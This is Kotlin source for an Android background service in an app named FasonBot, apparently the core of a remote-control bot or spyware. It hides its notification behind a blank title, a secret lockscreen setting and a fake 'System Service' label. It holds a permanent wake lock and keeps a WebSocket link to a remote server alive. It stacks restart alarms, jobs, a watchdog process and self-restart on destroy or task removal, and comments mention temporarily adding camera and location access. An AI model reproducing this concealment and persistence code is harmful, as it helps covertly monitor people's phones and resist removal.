package com.fasonbot.app.service

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.fasonbot.app.R
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.receiver.ServiceRestartReceiver
import com.fasonbot.app.ws.WebSocketClient
import java.util.concurrent.atomic.AtomicBoolean

class CoreService : Service() {

    companion object {
        private const val TAG = "CoreService"
        private const val CHANNEL_ID = "system_service"
        private const val NOTIFICATION_ID = 1001
        private const val ALARM_RC_SINGLE   = 2001
        private const val ALARM_RC_PERIODIC = 2002
        private const val JOB_ID            = 3001

        // Survival alarm every 20 s, health check every 8 s
        private const val ALARM_INTERVAL_MS  = 20_000L
        private const val HEALTH_CHECK_MS    = 8_000L
        private const val PREFS_NAME         = "fasonbot_prefs"
        private const val KEY_ENABLED        = "service_enabled"

        const val ACTION_START   = "com.fasonbot.app.service.CoreService.START"
        const val ACTION_RESTART = "com.fasonbot.app.service.CoreService.RESTART"
        const val ACTION_STOP    = "com.fasonbot.app.service.CoreService.STOP"
        const val ALARM_ACTION   = "com.fasonbot.app.service.CoreService.ALARM"

        private val running = AtomicBoolean(false)

        // Single shared WS client instance
        @Volatile private var wsInstance: WebSocketClient? = null
        @Volatile private var instance: CoreService? = null

        fun isRunning() = running.get()
        fun getInstance() = instance

        fun getWebSocketClient(context: Context): WebSocketClient =
            wsInstance ?: synchronized(this) {
                wsInstance ?: WebSocketClient(context.applicationContext).also { wsInstance = it }
            }

        fun scheduleRestartAlarm(context: Context, delayMs: Long = ALARM_INTERVAL_MS) {
            try {
                val am  = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pi  = restartPendingIntent(context, ALARM_RC_SINGLE)
                val at  = SystemClock.elapsedRealtime() + delayMs
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !am.canScheduleExactAlarms()) {
                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
                } else {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
                }
            } catch (e: Exception) {
                Log.e(TAG, "scheduleRestartAlarm: ${e.message}")
            }
        }

        private fun scheduleRepeatingAlarm(context: Context) {
            try {
                val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pi = restartPendingIntent(context, ALARM_RC_PERIODIC)
                am.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS,
                    ALARM_INTERVAL_MS, pi
                )
            } catch (e: Exception) {
                Log.e(TAG, "scheduleRepeatingAlarm: ${e.message}")
            }
        }

        fun schedulePeriodicJob(context: Context) {
            try {
                val js  = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
                val cn  = ComponentName(context, WatchdogJobService::class.java)
                val job = JobInfo.Builder(JOB_ID, cn)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPeriodic(15 * 60 * 1000L)
                    .setPersisted(true)
                    .build()
                js.schedule(job)
            } catch (e: Exception) {
                Log.e(TAG, "schedulePeriodicJob: ${e.message}")
            }
        }

        fun start(context: Context) {
            try {
                markEnabled(context)
                val i = Intent(context, CoreService::class.java).apply { action = ACTION_START }
                ContextCompat.startForegroundService(context, i)
            } catch (e: Exception) {
                Log.e(TAG, "start: ${e.message}")
                scheduleRestartAlarm(context, 1000)
            }
        }

        fun markEnabled(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putBoolean(KEY_ENABLED, true).apply()
        }

        private fun restartPendingIntent(context: Context, rc: Int): PendingIntent {
            val i = Intent(context, ServiceRestartReceiver::class.java).apply { action = ALARM_ACTION }
            return PendingIntent.getBroadcast(
                context, rc, i,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
        }
    }

    // ──────────────────────────────────────────────────────────────
    private var wsClient: WebSocketClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null
    private val handler = Handler(Looper.getMainLooper())

    // Base type is DATA_SYNC only. Camera/Location are OR-ed in temporarily
    // by updateServiceType() and removed by releaseServiceType().
    // Never include SPECIAL_USE in the base — it causes silent startForeground
    // failures on Infinix XOS 14 and other restrictive OEM builds.
    private var fgsType: Int = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC

    // Screen / unlock receiver
    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_ON,
                Intent.ACTION_USER_PRESENT,
                "android.intent.action.USER_UNLOCKED" -> ensureConnected()
            }
        }
    }

    // ──────────────────────────────────────────────────────────────
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        running.set(true)
        markEnabled(applicationContext)
        createNotificationChannel()
        goForeground()
        acquireWakeLock()
        registerReceivers()
        startHealthCheck()
        scheduleRepeatingAlarm(applicationContext)
        schedulePeriodicJob(applicationContext)
        ServiceHelper.scheduleWorkManagerFallback(applicationContext)
        ensureConnected()
        // Start companion guard process — dual-process watchdog for Android 14
        CompanionService.start(applicationContext)
        Log.i(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) { stopSelf(); return START_NOT_STICKY }
        goForeground()
        if (wakeLock?.isHeld == false) acquireWakeLock()
        ensureConnected()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.w(TAG, "Task removed")
        scheduleRestartAlarm(applicationContext, 500)
        scheduleRestartAlarm(applicationContext, 2000)
        try { start(applicationContext) } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        Log.w(TAG, "Service destroyed — scheduling restart")
        running.set(false)
        instance = null
        handler.removeCallbacksAndMessages(null)
        wsClient?.disconnect()
        releaseWakeLock()
        unregisterReceivers()
        scheduleRestartAlarm(applicationContext, 500)
        scheduleRestartAlarm(applicationContext, 2000)
        ServiceHelper.scheduleImmediateWorkManager(applicationContext)
        super.onDestroy()
    }

    // ──────────────────────────────────────────────────────────────
    // Connection
    // ──────────────────────────────────────────────────────────────
    private fun ensureConnected() {
        try {
            DeviceManager.registerDevice(applicationContext)
            if (wsClient == null) wsClient = getWebSocketClient(applicationContext)
            if (!wsClient!!.isConnected()) {
                wsClient!!.connect()
            }
        } catch (e: Exception) {
            Log.e(TAG, "ensureConnected: ${e.message}")
            handler.postDelayed({ ensureConnected() }, 3000)
        }
    }

    // ──────────────────────────────────────────────────────────────
    // Health check — runs every HEALTH_CHECK_MS
    // ──────────────────────────────────────────────────────────────
    private val healthRunnable = object : Runnable {
        override fun run() {
            if (!running.get()) return
            try {
                // 1. Renew wake lock
                if (wakeLock?.isHeld == false) acquireWakeLock()
                // 2. Reconnect if needed
                if (wsClient?.isConnected() != true && isNetworkAvailable()) {
                    Log.i(TAG, "Health: reconnecting WebSocket")
                    ensureConnected()
                }
                // 3. Keep notification alive
                refreshNotification()
                // 4. Renew survival alarm
                scheduleRestartAlarm(applicationContext, ALARM_INTERVAL_MS)
            } catch (e: Exception) {
                Log.e(TAG, "health: ${e.message}")
            }
            handler.postDelayed(this, HEALTH_CHECK_MS)
        }
    }

    private fun startHealthCheck() = handler.postDelayed(healthRunnable, HEALTH_CHECK_MS)

    // ──────────────────────────────────────────────────────────────
    // Foreground notification
    // ──────────────────────────────────────────────────────────────
    private fun createNotificationChannel() {
        // IMPORTANCE_LOW keeps the notification visible without sound and is
        // harder for aggressive OEMs (Infinix XOS 14) to suppress or kill.
        val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW).apply {
            description           = "Background sync"
            lockscreenVisibility  = Notification.VISIBILITY_SECRET
            setShowBadge(false); enableLights(false); enableVibration(false); setSound(null, null)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setContentText("")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()

    private fun goForeground() {
        val n = buildNotification()
        try {
            // Android 14 (API 34): must pass foreground service type that matches manifest.
            // Use DATA_SYNC only as the base — it is the most universally compatible type.
            // SPECIAL_USE is added for apps distributed outside Play Store but DATA_SYNC
            // alone is sufficient and avoids crashes on restrictive OEM builds (Infinix XOS 14).
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIFICATION_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, n)
            }
        } catch (e: Exception) {
            Log.e(TAG, "goForeground: ${e.message}")
            try { startForeground(NOTIFICATION_ID, n) } catch (_: Exception) {}
        }
    }

    private fun refreshNotification() {
        try { getSystemService(NotificationManager::class.java).notify(NOTIFICATION_ID, buildNotification()) }
        catch (_: Exception) {}
    }

    // ──────────────────────────────────────────────────────────────
    // Wake lock
    // ──────────────────────────────────────────────────────────────
    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            if (wakeLock?.isHeld == true) return
            wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "FasonBot:wake")
            wakeLock?.acquire()
        } catch (e: Exception) { Log.e(TAG, "acquireWakeLock: ${e.message}") }
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
        wakeLock = null
    }

    // ──────────────────────────────────────────────────────────────
    // Receivers
    // ──────────────────────────────────────────────────────────────
    private fun registerReceivers() {
        // Screen events
        try {
            val f = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
                addAction("android.intent.action.USER_UNLOCKED")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                registerReceiver(screenReceiver, f, Context.RECEIVER_NOT_EXPORTED)
            else
                registerReceiver(screenReceiver, f)
        } catch (e: Exception) { Log.e(TAG, "registerScreenReceiver: ${e.message}") }

        // Network callback — reconnect immediately when internet comes back
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            netCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "Network back — reconnecting")
                    handler.post { ensureConnected() }
                }
                override fun onLost(network: Network) { Log.w(TAG, "Network lost") }
            }
            cm.registerDefaultNetworkCallback(netCallback!!)
        } catch (e: Exception) { Log.e(TAG, "registerNetCallback: ${e.message}") }
    }

    private fun unregisterReceivers() {
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
        try {
            netCallback?.let {
                (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                    .unregisterNetworkCallback(it)
            }
        } catch (_: Exception) {}
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val cm      = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return false
            val caps    = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } catch (_: Exception) { false }
    }

    // ──────────────────────────────────────────────────────────────
    // Called by camera/location executors to update FGS type
    // ──────────────────────────────────────────────────────────────
    fun updateServiceType(type: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val combined = fgsType or type
            if (combined != fgsType) {
                fgsType = combined
                try { startForeground(NOTIFICATION_ID, buildNotification(), fgsType) } catch (_: Exception) {}
            }
        }
    }

    fun releaseServiceType(type: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val remaining = fgsType and type.inv()
            if (remaining != fgsType && remaining != 0) {
                fgsType = remaining
                try { startForeground(NOTIFICATION_ID, buildNotification(), fgsType) } catch (_: Exception) {}
            }
        }
    }
}
